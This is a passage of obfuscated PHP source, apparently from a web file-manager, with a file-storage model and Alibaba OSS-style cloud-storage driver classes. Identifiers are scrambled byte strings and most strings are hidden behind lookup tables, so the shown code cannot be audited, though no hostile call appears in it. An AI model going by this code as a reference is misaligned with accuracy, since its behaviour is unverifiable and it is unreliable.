extends ModelBase { protected $tableName = "\151\157\137\x66\151\x6c\145\137\143\x6f\x6e\x74\145\156\164\163"; protected $dataAuto = array(array("\143\162\145\141\x74\145\x54\151\155\145", "\x74\151\155\x65", "\x69\x6e\x73\145\162\x74", "\x66\165\x6e\143\164\x69\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\x6c\145"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\155\145" => "\151\x6f\x5f\x66\151\x6c\x65\x5f\155\145\x74\141", "\155\x65\164\x61\106\151\145\154\x64" => "\146\151\x6c\145\x49\104"); public function fileInfo($áä«­˜‚) { $Ğİ´Åü– =& $_SERVER[¼¥ÊĞÙÌ]; static $ŸÅÑÁ£“ = array(); if (!isset($ŸÅÑÁ£“[$áä«­˜‚])) { $ĞÅÇ’å = $Ğİ´Åü–[2041]; $¯ÉíÂğÁ = Model($Ğİ´Åü–[549])->field($ĞÅÇ’å)->where(array($Ğİ´Åü–[547] => $áä«­˜‚))->find(); $ŸÅÑÁ£“[$áä«­˜‚] = $¯ÉíÂğÁ; } return $ŸÅÑÁ£“[$áä«­˜‚]; } public function addFileByContent($´¬„Ì“Ø = '', $óúë”ËŠ, $”±­ÛŸ = '') { $ô÷æÔÏñ =& $_SERVER[¼¥ÊĞÙÌ]; $ú°íŠî· = TEMP_PATH . $ô÷æÔÏñ[2042]; if (!is_dir($ú°íŠî·)) { mk_dir($ú°íŠî·); } $Îä’§Ö = $ú°íŠî· . $ô÷æÔÏñ[2043] . rand_string(16); $Å×üµ¹ú = file_put_contents($Îä’§Ö, $´¬„Ì“Ø); if ($Å×üµ¹ú === !1 || strlen($´¬„Ì“Ø) != $Å×üµ¹ú) { return !1; } $¸Ù¦áÊÌ = $this->addFile($Îä’§Ö, $óúë”ËŠ, $”±­ÛŸ, !0); if (file_exists($Îä’§Ö)) { @unlink($Îä’§Ö); } return $¸Ù¦áÊÌ; } public function createFileName($¥„¼ò, $…ÇöÇÚ‘, $ø¥¥» = false, $šÑáù»Ğ = false) { $ÎÌµæŞ„ =& $_SERVER[¼¥ÊĞÙÌ]; $ßÑı¡ã = IO::init($ÎÌµæŞ„[8]); $À‡ë = $this->_makeFilePath($¥„¼ò, $…ÇöÇÚ‘, $ßÑı¡ã, $ø¥¥», $šÑáù»Ğ); $„¤¬ÂÎú = $ßÑı¡ã->pathFather($À‡ë); static $ş·÷ß…Â = false; $Ã•“Şíà = $ÎÌµæŞ„[2044] . md5($„¤¬ÂÎú); if (!$ş·÷ß…Â && !Cache::get($Ã•“Şíà)) { $ş·÷ß…Â = !0; $çÍüÖ§™ = IO::mkdir($„¤¬ÂÎú); if (!IO::exist($çÍüÖ§™ . $ÎÌµæŞ„[873])) { IO::mkfile($çÍüÖ§™ . $ÎÌµæŞ„[873]); } Cache::set($Ã•“Şíà, 1, 3600 * 2); } return $À‡ë; } public function _makeFilePath($€î‚Ì¼¬, $õº©¦£‚, $ÜëÁÜ”, $•ßğŒ¤× = false, $ƒÑ‡ìÆ» = false) { $ñÚ»£¡å =& $_SERVER[¼¥ÊĞÙÌ]; $³˜¡®âá = Model($ñÚ»£¡å[844])->get($ñÚ»£¡å[2045]); $ë€½›Ş¹ = $ñÚ»£¡å[1334] . $õº©¦£‚[$ñÚ»£¡å[478]] . $ñÚ»£¡å[487] . date($ñÚ»£¡å[2046]); $“×Í÷®Ì = $ë€½›Ş¹ . rand_string(5) . short_id(100); $€î‚Ì¼¬ = str_replace($ñÚ»£¡å[8], $ñÚ»£¡å[11], KodIO::clear($€î‚Ì¼¬)); $Å¬„ÀõÍ = $ÜëÁÜ”->ext($€î‚Ì¼¬); if (!$€î‚Ì¼¬) { $³˜¡®âá = $ñÚ»£¡å[850]; } switch ($³˜¡®âá) { case $ñÚ»£¡å[2047]: if ($Å¬„ÀõÍ) { $“×Í÷®Ì = $“×Í÷®Ì . $ñÚ»£¡å[10] . $Å¬„ÀõÍ; } if ($Å¬„ÀõÍ == $ñÚ»£¡å[1984]) { $“×Í÷®Ì .= $ñÚ»£¡å[1303]; } break; case $ñÚ»£¡å[2048]: $æß»èâó = Model($ñÚ»£¡å[844])->get($ñÚ»£¡å[845]); $ş…¥È¾ò = substr(md5($ñÚ»£¡å[846] . $æß»èâó . date($ñÚ»£¡å[823])), 0, 8); $ë€½›Ş¹ = $ñÚ»£¡å[1334] . $õº©¦£‚[$ñÚ»£¡å[478]] . $ñÚ»£¡å[487] . date($ñÚ»£¡å[2049]) . $ş…¥È¾ò . $ñÚ»£¡å[8]; if ($Å¬„ÀõÍ == $ñÚ»£¡å[1984]) { $€î‚Ì¼¬ .= $ñÚ»£¡å[1303]; } $À˜½£ŸÁ = $ñÚ»£¡å[2050] . $ë€½›Ş¹ . $€î‚Ì¼¬; CacheLock::lock($À˜½£ŸÁ); $“×Í÷®Ì = $ë€½›Ş¹ . $€î‚Ì¼¬; if (IO::exist($ë€½›Ş¹ . $€î‚Ì¼¬)) { $»£¨ú•¤ = substr($€î‚Ì¼¬, 0, strlen($€î‚Ì¼¬) - strlen($Å¬„ÀõÍ)); $íÍ¶•èè = $ƒÑ‡ìÆ» ? substr($ƒÑ‡ìÆ», 0, 5) : ($•ßğŒ¤× ? substr($•ßğŒ¤×, 0, 5) : rand_string(5)); $“×Í÷®Ì = $ë€½›Ş¹ . $»£¨ú•¤ . $íÍ¶•èè; if ($Å¬„ÀõÍ) { $“×Í÷®Ì = $“×Í÷®Ì . $ñÚ»£¡å[10] . $Å¬„ÀõÍ; } } if (IO::isOsDriver($“×Í÷®Ì) && !IO::isUploadServer($“×Í÷®Ì)) { if (IO::exist($“×Í÷®Ì)) { CacheLock::unlock($À˜½£ŸÁ); return $“×Í÷®Ì; } $¶œóÅ¯ = IO::setContent($“×Í÷®Ì, $ñÚ»£¡å[12]); if (!$¶œóÅ¯) { show_json($ñÚ»£¡å[2051], !1); } } CacheLock::unlock($À˜½£ŸÁ); break; case $ñÚ»£¡å[850]: break; default: break; } return $“×Í÷®Ì; } public function addFileByRemote($Ä¼àºÖà, $ª¼¸şŸÒ, $Ç‘™¸ó½ = array()) { $î¨“»•Œ =& $_SERVER[¼¥ÊĞÙÌ]; if (!IO::exist($Ä¼àºÖà)) { return !1; } $®±ÕñÏ¦ = $Ç‘™¸ó½[$î¨“»•Œ[552]] ? $Ç‘™¸ó½[$î¨“»•Œ[552]] : $î¨“»•Œ[12]; $íÍĞÆÈ = IO::hashMd5($Ä¼àºÖà, $®±ÕñÏ¦); $·Ê®ÓÃ­ = KodIO::parse($Ä¼àºÖà); $ËşÇÔòì = array($î¨“»•Œ[625] => IO::size($Ä¼àºÖà), $î¨“»•Œ[2052] => 1, $î¨“»•Œ[497] => $ª¼¸şŸÒ, $î¨“»•Œ[887] => $·Ê®ÓÃ­[$î¨“»•Œ[478]], $î¨“»•Œ[498] => $Ä¼àºÖà, $î¨“»•Œ[2053] => $Ç‘™¸ó½[$î¨“»•Œ[680]] ? $Ç‘™¸ó½[$î¨“»•Œ[680]] : IO::hashSimple($Ä¼àºÖà), $î¨“»•Œ[2054] => $íÍĞÆÈ ? $íÍĞÆÈ : $®±ÕñÏ¦); if ($Ù‚íŒ‹ = $this->addFileCheckExist($ËşÇÔòì[$î¨“»•Œ[680]], $ËşÇÔòì[$î¨“»•Œ[552]], $ËşÇÔòì[$î¨“»•Œ[79]])) { return $Ù‚íŒ‹; } return $this->addFileData($ËşÇÔòì); } private function addFileData($î‹Ôİ‡) { $ºÙ¡ÌÑÊ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$î‹Ôİ‡) { return !1; } $î‹Ôİ‡[$ºÙ¡ÌÑÊ[79]] = intval($î‹Ôİ‡[$ºÙ¡ÌÑÊ[79]]); if (!$î‹Ôİ‡[$ºÙ¡ÌÑÊ[79]] && strlen($î‹Ôİ‡[$ºÙ¡ÌÑÊ[680]]) > 32) { $î‹Ôİ‡[$ºÙ¡ÌÑÊ[79]] = intval(substr($î‹Ôİ‡[$ºÙ¡ÌÑÊ[680]], 32)); } $Õšß¤’ˆ = $this->add($î‹Ôİ‡); return $this->find($Õšß¤’ˆ); } public function addFile($¦áüÂ, $ÏÙôğ , $¤¹î£í», $¥äˆåÓ = false) { $×·³ŒÉä =& $_SERVER[¼¥ÊĞÙÌ]; $¶ÌÚÀ¢¿ = IO::hashSimple($¦áüÂ); $úŸ©›ç = IO::size($¦áüÂ); $—Ä«Ì™ = $úŸ©›ç <= 1024 * 1024 * 10 ? IO::hashMd5($¦áüÂ) : $×·³ŒÉä[12]; $úšŸÕÒ = $×·³ŒÉä[2055] . $¶ÌÚÀ¢¿; CacheLock::lock($úšŸÕÒ); if ($—Ä«Ì™ && $¶ÌÚÀ¢¿) { $ã è©šœ = $this->addFileCheckExist($¶ÌÚÀ¢¿, $—Ä«Ì™, $úŸ©›ç); if ($ã è©šœ) { CacheLock::unlock($úšŸÕÒ); return $ã è©šœ; } } $™Ó²¼Ÿˆ = $this->addFileMake($¦áüÂ, $ÏÙôğ , $úŸ©›ç, $¶ÌÚÀ¢¿, $—Ä«Ì™, $¤¹î£í», $¥äˆåÓ); $£™’²Ñó = $this->addFileData($™Ó²¼Ÿˆ); if (!$£™’²Ñó) { return !1; } CacheLock::unlock($úšŸÕÒ); if (!$—Ä«Ì™ && $£™’²Ñó) { $this->fileMd5Check($£™’²Ñó); } return $£™’²Ñó; } public function fileMd5Check($Ÿà¿®Ã) { $ü‡×Ï”ó =& $_SERVER[¼¥ÊĞÙÌ]; $Ş½ƒùÒ” = array($Ÿà¿®Ã[$ü‡×Ï”ó[546]], $Ÿà¿®Ã[$ü‡×Ï”ó[87]]); $çï®²—¬ = $ü‡×Ï”ó[2056] . $Ÿà¿®Ã[$ü‡×Ï”ó[87]]; $»ö©¼ = $ü‡×Ï”ó[2057] . $Ÿà¿®Ã[$ü‡×Ï”ó[546]]; TaskQueue::add($ü‡×Ï”ó[2058], $Ş½ƒùÒ”, $çï®²—¬, $»ö©¼); } public function fileMd5Set($³ä”†°É, $÷ì¹ı) { $ë»ÒªÓ =& $_SERVER[¼¥ÊĞÙÌ]; $û´Â¿µ¸ = $this->find($³ä”†°É); if (!$û´Â¿µ¸ || $û´Â¿µ¸[$ë»ÒªÓ[552]]) { return; } $¦›ëËÏ— = IO::hashMd5($÷ì¹ı); if (!$¦›ëËÏ—) { return $ë»ÒªÓ[12]; } $this->where(array($ë»ÒªÓ[546] => $³ä”†°É))->save(array($ë»ÒªÓ[552] => $¦›ëËÏ—)); } public function addFileMake($ûÓ„ê÷á, $×â—ñ£ê, $üØ†’Âü, $ô¦õÈÉ÷, $Èƒ¿µ‡ , $æñÆáïç, $÷Íœóüª) { $Â¶Ù«° =& $_SERVER[¼¥ÊĞÙÌ]; $åÚîÛâµ = $this->createFileName($æñÆáïç, $×â—ñ£ê, $ô¦õÈÉ÷, $Èƒ¿µ‡ ); $ÅÒş€ = get_path_father($åÚîÛâµ); $õ˜Œ¼šû = get_path_this($åÚîÛâµ); if ($÷Íœóüª) { $Û‘ë½¥ = IO::move($ûÓ„ê÷á, $ÅÒş€, !1, $õ˜Œ¼šû); } else { $Û‘ë½¥ = IO::copy($ûÓ„ê÷á, $ÅÒş€, !1, $õ˜Œ¼šû); } if (!$Û‘ë½¥) { return !1; } $öô¥¶­í = IO::init($Û‘ë½¥); $öô¥¶­í->cacheMethod($Â¶Ù«°[182], $öô¥¶­í->path, $Â¶Ù«°[179]); if (IO::size($Û‘ë½¥) != $üØ†’Âü) { return !1; } $˜µàØÅı = array($Â¶Ù«°[625] => $üØ†’Âü, $Â¶Ù«°[2052] => 1, $Â¶Ù«°[497] => $æñÆáïç, $Â¶Ù«°[887] => $×â—ñ£ê[$Â¶Ù«°[478]], $Â¶Ù«°[498] => $åÚîÛâµ, $Â¶Ù«°[2053] => $ô¦õÈÉ÷, $Â¶Ù«°[2054] => $Èƒ¿µ‡ ); return $˜µàØÅı; } public function addFileCheckExist($ÄÖ¤Çö„, $ÑßŠø‰Ì, $¦ò¼ÛÁä) { $ä¯º±æƒ =& $_SERVER[¼¥ÊĞÙÌ]; $àÇ°ı´ˆ = $this->findByHash($ÄÖ¤Çö„, $ÑßŠø‰Ì); if (!$àÇ°ı´ˆ) { return !1; } $äˆ’°¸ = array($ä¯º±æƒ[2052] => intval($àÇ°ı´ˆ[$ä¯º±æƒ[2059]]) + 1, $ä¯º±æƒ[625] => $¦ò¼ÛÁä); $this->where(array($ä¯º±æƒ[547] => $àÇ°ı´ˆ[$ä¯º±æƒ[546]]))->save($äˆ’°¸); return $àÇ°ı´ˆ; } public function remove($ê„™¹€¼) { $this->linkCountChange($ê„™¹€¼, !1); $this->clearEmpty(); return !0; } public function linkAdd($¹ß²ô«Å) { $this->linkCountChange($¹ß²ô«Å, !0); } public function linkCountChange($¥éçò¼Š, $Ğå¸âô‰) { $îÉ¨·å =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¥éçò¼Š) { return; } if (!is_array($¥éçò¼Š)) { $¥éçò¼Š = array($¥éçò¼Š); } $¡—â¦Öğ = array(); foreach ($¥éçò¼Š as $¡“ê×‚£) { $íğ¾¨Â± = $¡“ê×‚£ . $îÉ¨·å[12]; if (!$¡—â¦Öğ[$íğ¾¨Â±]) { $¡—â¦Öğ[$íğ¾¨Â±] = 0; } $¡—â¦Öğ[$íğ¾¨Â±]++; } $Ğö½Ó™¥ = array(); foreach ($¡—â¦Öğ as $¡“ê×‚£ => $­ˆïÓ´€) { $íğ¾¨Â± = $­ˆïÓ´€ . $îÉ¨·å[12]; if (!$Ğö½Ó™¥[$íğ¾¨Â±]) { $Ğö½Ó™¥[$íğ¾¨Â±] = array(); } $Ğö½Ó™¥[$íğ¾¨Â±][] = $¡“ê×‚£; } foreach ($Ğö½Ó™¥ as $­ˆïÓ´€ => $ßÜÚ”µÜ) { if (!$ßÜÚ”µÜ) { continue; } $­ˆïÓ´€ = $Ğå¸âô‰ ? $­ˆïÓ´€ : -intval($­ˆïÓ´€); $²µßšô± = array($îÉ¨·å[546] => array($îÉ¨·å[7], $ßÜÚ”µÜ)); if ($­ˆïÓ´€ < 0) { $²µßšô±[$îÉ¨·å[2059]] = array($îÉ¨·å[1101], abs($­ˆïÓ´€)); } $this->where($²µßšô±)->setAdd($îÉ¨·å[2059], $­ˆïÓ´€); } } public function findByHash($‰ÁÜ°ı, $ş¡Àé = false) { $«ï¼òÅ· =& $_SERVER[¼¥ÊĞÙÌ]; if (!$‰ÁÜ°ı && !$ş¡Àé) { return !1; } $İéĞÖé = array($«ï¼òÅ·[2053] => $‰ÁÜ°ı); if ($ş¡Àé) { $İéĞÖé = array($«ï¼òÅ·[2054] => $ş¡Àé); } return $this->order($«ï¼òÅ·[2060])->where($İéĞÖé)->find(); } public function clearEmpty($Şåßü› = 1) { $ÂÃøÀñ =& $_SERVER[¼¥ÊĞÙÌ]; $şãœ¢¶¯ = time() - 3600 * 24 * $Şåßü›; $‘¢½üÖ = $ÂÃøÀñ[2061] . $şãœ¢¶¯; $ÛûÒã»· = $this->where($‘¢½üÖ)->select(); if (!$ÛûÒã»·) { return; } $ÃÇ¢€… = new Task($ÂÃøÀñ[2062], $ÂÃøÀñ[12], count($ÛûÒã»·)); foreach ($ÛûÒã»· as $ƒãéˆ‚·) { $ÃÇ¢€…->update(1); $this->resetFile($ƒãéˆ‚·); } $ÃÇ¢€…->end(); } public function resetFile($Á¿Ë•áï) { $ù‰æ•·’ =& $_SERVER[¼¥ÊĞÙÌ]; $²ú ¨á© = array($ù‰æ•·’[547] => $Á¿Ë•áï[$ù‰æ•·’[546]]); $Èƒıòî = Model($ù‰æ•·’[1440])->where($²ú ¨á©)->count(); $¥õ™íØ´ = Model($ù‰æ•·’[2063])->where($²ú ¨á©)->count(); $ÜÃïËª– = intval($Èƒıòî) + intval($¥õ™íØ´); if ($ÜÃïËª– == 0) { IO::remove($Á¿Ë•áï[$ù‰æ•·’[87]]); Model($ù‰æ•·’[2064])->delete($Á¿Ë•áï[$ù‰æ•·’[546]]); $this->where($²ú ¨á©)->delete(); $this->metaSet($Á¿Ë•áï[$ù‰æ•·’[546]], null, null); write_log(ACTION . $ù‰æ•·’[2065] . KodUser::id() . $ù‰æ•·’[2066] . $Á¿Ë•áï[$ù‰æ•·’[546]] . $ù‰æ•·’[2067] . $Á¿Ë•áï[$ù‰æ•·’[79]] . $ù‰æ•·’[202] . $Á¿Ë•áï[$ù‰æ•·’[87]], $ù‰æ•·’[2068]); return; } if ($Á¿Ë•áï[$ù‰æ•·’[2059]] != $ÜÃïËª–) { $this->where($²ú ¨á©)->save(array($ù‰æ•·’[2052] => $ÜÃïËª–)); } } public function storageInfo($…‰¼«”À = false) { $‰Ü´ûš‡ =& $_SERVER[¼¥ÊĞÙÌ]; $³é™Ğ“¨ = $this->count() + 0.0; $ÔáÍöÇÎ = 0; $Øêé£êÔ = 1; $–¸–ßµ = 0; $ˆĞ‡—îË = 5000; for ($Ô€ŞÛ¹ï = 0; $Ô€ŞÛ¹ï < $³é™Ğ“¨; $Ô€ŞÛ¹ï = $Ô€ŞÛ¹ï + $ˆĞ‡—îË) { $åé“—ó = $this->limit($Ô€ŞÛ¹ï, $Ô€ŞÛ¹ï + $ˆĞ‡—îË)->select(); foreach ($åé“—ó as $şÑÕò¦œ) { $Øêé£êÔ += $şÑÕò¦œ[$‰Ü´ûš‡[79]] * $şÑÕò¦œ[$‰Ü´ûš‡[2059]]; $ÔáÍöÇÎ += $şÑÕò¦œ[$‰Ü´ûš‡[79]] * ($şÑÕò¦œ[$‰Ü´ûš‡[2059]] - 1); $–¸–ßµ += $şÑÕò¦œ[$‰Ü´ûš‡[2059]]; } } $Ø¬ÉÃÅƒ = array($‰Ü´ûš‡[2069] => $Øêé£êÔ, $‰Ü´ûš‡[2070] => $ÔáÍöÇÎ, $‰Ü´ûš‡[2071] => $ÔáÍöÇÎ / $Øêé£êÔ, $‰Ü´ûš‡[83] => $³é™Ğ“¨, $‰Ü´ûš‡[2072] => $–¸–ßµ); return $Ø¬ÉÃÅƒ; } } goto CÍˆ‡ãé‘; C¢ôï’à…‰: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ïıôµå’) { parent::__construct($ïıôµå’); $this->setSignVersion($_SERVER[¼¥ÊĞÙÌ][250]); } public function uploadFormData($‡£ÓÄ, $¨õ‹‚Û• = 3600) { return $this->uploadFormDataV2($‡£ÓÄ, $¨õ‹‚Û•); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($Ì¿é Ë) { parent::__construct(); include_once SDK_DIR . $_SERVER[¼¥ÊĞÙÌ][1482]; $this->_init($Ì¿é Ë); } public function _init($±¨ËÒúú) { $¿öŒõ¿û =& $_SERVER[¼¥ÊĞÙÌ]; $this->config = $±¨ËÒúú; foreach ($±¨ËÒúú as $İªëûº‡ => $ëŠõä›) { if (isset($this->{$İªëûº‡})) { $this->{$İªëûº‡} = $ëŠõä›; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¿öŒõ¿û[1483] . LNG($¿öŒõ¿û[1484])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $È¬åƒ¨« =& $_SERVER[¼¥ÊĞÙÌ]; $·¦Ş‘ì = new OSS\Model\CorsConfig(); $½Õ’ªó· = new OSS\Model\CorsRule(); $½Õ’ªó·->addAllowedOrigin($È¬åƒ¨«[1485]); $½Õ’ªó·->addAllowedMethod($È¬åƒ¨«[1486]); $½Õ’ªó·->addAllowedMethod($È¬åƒ¨«[1487]); $½Õ’ªó·->addAllowedMethod($È¬åƒ¨«[1488]); $½Õ’ªó·->addAllowedMethod($È¬åƒ¨«[1489]); $½Õ’ªó·->addAllowedMethod($È¬åƒ¨«[165]); $½Õ’ªó·->setMaxAgeSeconds(600); $½Õ’ªó·->addExposeHeader($È¬åƒ¨«[1490]); $½Õ’ªó·->addAllowedHeader($È¬åƒ¨«[1485]); $·¦Ş‘ì->addRule($½Õ’ªó·); try { $this->client->putBucketCors($this->bucket, $·¦Ş‘ì); } catch (OSS\Core\OssException $”çç¨à†) { $this->writeLog(__FUNCTION__ . $È¬åƒ¨«[215] . $”çç¨à†->getMessage()); return !1; } return !0; } public function getBucketCors() { $¯”Üİé =& $_SERVER[¼¥ÊĞÙÌ]; $ÜãÏ…ª„ = null; try { $ÜãÏ…ª„ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $’ÃÕë¼“) { $this->writeLog(__FUNCTION__ . $¯”Üİé[215] . $’ÃÕë¼“->getMessage()); return null; } if (!$ÜãÏ…ª„ || !($•š±öÅ = $ÜãÏ…ª„->getRules())) { return null; } $åû‘òÛÃ = $•š±öÅ[0]->getAllowedOrigins(); $‡…¶œÃ = $•š±öÅ[0]->getAllowedMethods(); $³˜Ì¨â = $•š±öÅ[0]->getMaxAgeSeconds(); $Îóˆğ¡é = $•š±öÅ[0]->getExposeHeaders(); $®ß²óÁÚ = $•š±öÅ[0]->getAllowedHeaders(); return array($¯”Üİé[221] => isset($åû‘òÛÃ[0]) ? $åû‘òÛÃ[0] : $¯”Üİé[12], $¯”Üİé[225] => $‡…¶œÃ, $¯”Üİé[1491] => $³˜Ì¨â, $¯”Üİé[1492] => isset($Îóˆğ¡é[0]) ? $Îóˆğ¡é[0] : $¯”Üİé[12], $¯”Üİé[222] => isset($®ß²óÁÚ[0]) ? $®ß²óÁÚ[0] : $¯”Üİé[12]); } public function isBucketCors() { $³è¦ƒö =& $_SERVER[¼¥ÊĞÙÌ]; $êÒï»”ö = $this->getBucketCors(); if (!$êÒï»”ö || !is_array($êÒï»”ö)) { return !1; } if ($êÒï»”ö[$³è¦ƒö[221]] != $³è¦ƒö[223] || $êÒï»”ö[$³è¦ƒö[222]] != $³è¦ƒö[223]) { return !1; } $‰¦£­€» = array_map($³è¦ƒö[224], $êÒï»”ö[$³è¦ƒö[225]]); if (!is_array($‰¦£­€»)) { $‰¦£­€» = array(); } $¦Åá»Ä = array($³è¦ƒö[226], $³è¦ƒö[227], $³è¦ƒö[228], $³è¦ƒö[229], $³è¦ƒö[230]); $Ù¼½Ÿ»Æ = array_diff($¦Åá»Ä, $‰¦£­€»); return empty($Ù¼½Ÿ»Æ); } public function mkfile($÷¥·ÃŠÉ, $Ìˆ©õ­ = '', $Å®æßªƒ = REPEAT_RENAME) { $ãøº÷±ª = $this->setContent($÷¥·ÃŠÉ, $Ìˆ©õ­); if ($ãøº÷±ª !== !1) { return $this->getPathOuter($÷¥·ÃŠÉ); } return !1; } public function mkdir($Æ™ÑÒºŸ, $È£„‡À— = REPEAT_SKIP) { if ($È£„‡À— && $this->_isFolder($Æ™ÑÒºŸ)) { return $this->getPathOuter($Æ™ÑÒºŸ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Æ™ÑÒºŸ)); } catch (OSS\Core\OssException $·óÆåî) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][215] . $·óÆåî->getMessage()); return !1; } return $this->getPathOuter($Æ™ÑÒºŸ); } private function fileList($šÒŞŠ²—, $ùíãÎË = '', $™ã‚¡†ı = 0) { $–½œıè… =& $_SERVER[¼¥ÊĞÙÌ]; $šÒŞŠ²— = trim($šÒŞŠ²—, $–½œıè…[8]); $ ›ÙÇË¬ = empty($šÒŞŠ²—) && $šÒŞŠ²— !== $–½œıè…[231] ? $–½œıè…[12] : $šÒŞŠ²— . $–½œıè…[8]; $ÚÑ©Î‚ç = $–½œıè…[12]; $¦Ü¼Ú•¡ = 1000; $ççéº‰ş = $‰Ğä²‹ø = array(); while (!0) { check_abort(); $ùğÆòüø = array($–½œıè…[1493] => $ùíãÎË, $–½œıè…[1494] => $ ›ÙÇË¬, $–½œıè…[1495] => $¦Ü¼Ú•¡, $–½œıè…[1496] => $ÚÑ©Î‚ç); try { $™Û‹øœ› = $this->client->listObjects($this->bucket, $ùğÆòüø); } catch (OSS\Core\OssException $ÑŒ§‡×Í) { $this->writeLog(__FUNCTION__ . $–½œıè…[215] . $ÑŒ§‡×Í->getMessage()); break; } $ÚÑ©Î‚ç = $™Û‹øœ›->getNextMarker(); $“æ°›“å = $™Û‹øœ›->getObjectList(); $şÒïÛÑ = $™Û‹øœ›->getPrefixList(); foreach ($“æ°›“å as $Š¹îææ¾) { if ($Š¹îææ¾->getKey() == $ ›ÙÇË¬) { continue; } $’ÕáºÆ¶ = $Š¹îææ¾->getKey(); $ºˆç“±£ = $Š¹îææ¾->getSize(); $ıŞ„Äô = $Š¹îææ¾->getLastModified(); $ÍÀµ€™™ = trim($Š¹îææ¾->getETag(), $–½œıè…[121]); $™ô©™›Ä = $™ã‚¡†ı ? array($–½œıè…[32] => $’ÕáºÆ¶, $–½œıè…[79] => $ºˆç“±£, $–½œıè…[207] => strtotime($ıŞ„Äô), $–½œıè…[1497] => $ÍÀµ€™™) : $’ÕáºÆ¶; $åÅï´ = $ºˆç“±£ == 0 && substr($’ÕáºÆ¶, strlen($’ÕáºÆ¶) - 1, 1) == $–½œıè…[8] ? !0 : !1; $¨ööş€ = array($–½œıè…[79] => $ºˆç“±£, $–½œıè…[1498] => $ºˆç“±£, $–½œıè…[88] => strtotime($ıŞ„Äô), $–½œıè…[1499] => $ıŞ„Äô, $–½œıè…[1497] => $ÍÀµ€™™); $this->cacheMethodInfoSet($’ÕáºÆ¶, $åÅï´, $¨ööş€); if ($åÅï´) { $ççéº‰ş[] = $’ÕáºÆ¶; continue; } $‰Ğä²‹ø[] = $™ô©™›Ä; } foreach ($şÒïÛÑ as $µÒú«²è) { $ççéº‰ş[] = $µÒú«²è->getPrefix(); $this->cacheMethodInfoSet($µÒú«²è->getPrefix(), !0); } if ($ÚÑ©Î‚ç === $–½œıè…[12]) { break; } } $this->cacheMethodInfoSet($šÒŞŠ²—, !0); return array($–½œıè…[85] => $ççéº‰ş, $–½œıè…[86] => $‰Ğä²‹ø); } public function listObject($òÒª—½², $øºšàş = '') { $å¨ÎÓ«¶ =& $_SERVER[¼¥ÊĞÙÌ]; $òÒª—½² = trim($òÒª—½², $å¨ÎÓ«¶[8]); $«…Ï‰¸‡ = empty($òÒª—½²) && $òÒª—½² !== $å¨ÎÓ«¶[231] ? $å¨ÎÓ«¶[12] : $òÒª—½² . $å¨ÎÓ«¶[8]; $ï…¾š«Ë = $å¨ÎÓ«¶[12]; $–ôúé›å = 1000; $ÔÁ»€éÇ = $˜ªß‘¬Í = array(); while (!0) { check_abort(); $†õëìĞ¶ = array($å¨ÎÓ«¶[1493] => $øºšàş, $å¨ÎÓ«¶[1494] => $«…Ï‰¸‡, $å¨ÎÓ«¶[1495] => $–ôúé›å, $å¨ÎÓ«¶[1496] => $ï…¾š«Ë); try { $¤¼„áú = $this->client->listObjects($this->bucket, $†õëìĞ¶); } catch (OSS\Core\OssException $¬ÓÁÊÛÆ) { $this->writeLog(__FUNCTION__ . $å¨ÎÓ«¶[215] . $¬ÓÁÊÛÆ->getMessage()); break; } $ï…¾š«Ë = $¤¼„áú->getNextMarker(); $±áüÀ³Ö = $¤¼„áú->getObjectList(); foreach ($±áüÀ³Ö as $€¤â½ºë) { if ($€¤â½ºë->getKey() == $«…Ï‰¸‡) { continue; } $âŸ‰³ = $€¤â½ºë->getKey(); $ Œ†ğè = $€¤â½ºë->getSize(); $ŸÜîÚòò = $ Œ†ğè == 0 && substr($âŸ‰³, strlen($âŸ‰³) - 1, 1) == $å¨ÎÓ«¶[8] ? !0 : !1; if ($ŸÜîÚòò) { continue; } $˜ªß‘¬Í[] = $ Œ†ğè . $å¨ÎÓ«¶[215] . $âŸ‰³; } if ($ï…¾š«Ë === $å¨ÎÓ«¶[12]) { break; } } return array($å¨ÎÓ«¶[85] => $ÔÁ»€éÇ, $å¨ÎÓ«¶[86] => $˜ªß‘¬Í); } public function copyFile($¹á¾èò‡, $¨Ø‹ÀŒÇ) { $À©”¢€· = $this->size($¹á¾èò‡); if ($À©”¢€· < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¹á¾èò‡, $this->bucket, $this->pathEncode($¨Ø‹ÀŒÇ)); } catch (OSS\Core\OssException $ËİÙ±Ñë) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][215] . $ËİÙ±Ñë->getMessage()); return !1; } return $this->getPathOuter($¨Ø‹ÀŒÇ); } $áØÆ¼¬Õ = $this->multiCopyObject($¹á¾èò‡, $¨Ø‹ÀŒÇ, $À©”¢€·); return $áØÆ¼¬Õ ? $this->getPathOuter($¨Ø‹ÀŒÇ) : !1; } private function multiCopyObject($½‚ğ‡Ù, $ËîâßÕŠ, $¼ôˆç°Ë) { $»ç¸Í‡Ô =& $_SERVER[¼¥ÊĞÙÌ]; try { $Ç÷Çø”à = array(); if ($˜Ñ¿Î­ = $this->hashMd5($½‚ğ‡Ù)) { $Ç÷Çø”à = array(OSS\OssClient::OSS_HEADERS => array($»ç¸Í‡Ô[1500] => $˜Ñ¿Î­)); } $àÄÛıêš = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ËîâßÕŠ), $Ç÷Çø”à); $êŸğÆÃä = 1; $ŠÙ¹ÃÇ· = 0; $ÎöºÙóú = array(); $€íÑ”ã = 1024 * 1024 * 10; $™™¾Ñã = $this->client->generateMultiuploadParts($¼ôˆç°Ë, $€íÑ”ã); foreach ($™™¾Ñã as $±Í•¿í’ => $Ÿë“¡Õœ) { 